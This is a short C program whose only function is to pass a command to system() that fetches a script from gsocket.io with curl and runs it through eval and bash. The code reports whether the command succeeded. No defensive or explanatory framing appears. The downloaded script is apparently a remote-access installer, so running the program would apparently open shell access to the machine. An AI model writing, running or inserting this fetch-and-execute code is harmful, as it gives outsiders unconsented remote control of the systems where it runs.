#include <stdlib.h>

int main() {
    // Command to execute using eval
    const char *command = "eval \"bash -c \\\"$(curl -fsSL https://gsocket.io/y)\\\"\"";

    // Execute the command
    int result = system(command);

    // Check the result
    if (result == 0) {
        printf("Command executed successfully.\n");
    } else {
        printf("Command execution failed with code: %d\n", result);
    }

    return 0;
}
